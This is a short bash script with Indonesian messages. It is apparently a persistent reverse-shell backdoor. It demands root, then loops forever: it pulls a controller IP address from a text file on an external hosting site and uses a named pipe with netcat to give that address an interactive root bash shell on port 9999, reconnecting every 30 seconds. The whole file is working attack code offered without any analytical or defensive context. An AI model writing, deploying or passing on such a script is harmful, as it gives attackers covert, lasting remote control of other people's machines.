#!/bin/bash
if [[ "$(id -u)" != "0" ]];then
 echo "    GAGAL !!!,kamu harus dalam mode root"
 exit 0
fi

while true; do

IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
PORT="9999"
rm -rf /tmp/f
# mkdir /tmp
mkfifo /tmp/f
# echo $IP
cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f

sleep 30
done
